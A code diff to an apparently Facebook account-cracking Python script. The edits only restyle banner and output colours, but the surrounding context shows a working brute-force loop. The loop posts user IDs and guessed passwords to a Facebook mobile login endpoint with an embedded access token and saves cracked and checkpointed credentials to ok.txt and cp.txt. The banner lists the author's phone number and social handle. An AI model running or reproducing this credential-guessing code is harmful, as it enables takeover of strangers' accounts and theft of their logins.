@@ -31,9 +31,9 @@ class Main:
 		print(" ")
 		print("    \033[0;97mo--o    O  o     o-o    o-o o  o \n    |   |  / \ |    o   o  /    |  | \n\033[0;91m    O--o  o---o|    |   | O     O--O \n\033[0;91m    |   | |   ||    o   o  \    |  | \n\033[0;97m    o--o  o   oO---o o-o    o-o o  o ")
 		print(" ")
-		print(" \033[0;91m(##)\033[0;97m Author  : Mubashar Baloch") 
-		print(" \033[0;91m(##)\033[0;97m Whtsap  : +923470336477") 
-		print(" \033[0;91m(##)\033[0;97m FB      : fb.com/MUB4SH4R") 
+		print(" \033[0;91m(##)\033[0;97m Author  : \033[0;91mMubashar Baloch") 
+		print(" \033[0;91m(##)\033[0;97m Whtsap  : \033[0;91m+923470336477") 
+		print(" \033[0;91m(##)\033[0;97m FB      : \033[0;91mfb.com/MUB4SH4R") 
 		print(" \033[0;91m(##)\033[0;97m --------------------------------") 
 		print(" \033[0;91m(##)\033[0;97m IP      : %s"%(self.ips)) 
 		print("\n \033[0;91m(01)\033[0;97m CRACK RANDOM ACOUNT NEW \033[0;91m(2021 to 2015)\033[0;97m ")
@@ -187,12 +187,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m(Baloch-Ok) %s|%s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m[Baloch-Ok] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;93m(Baloch-Cp) %s|%s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m[Baloch-Cp] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
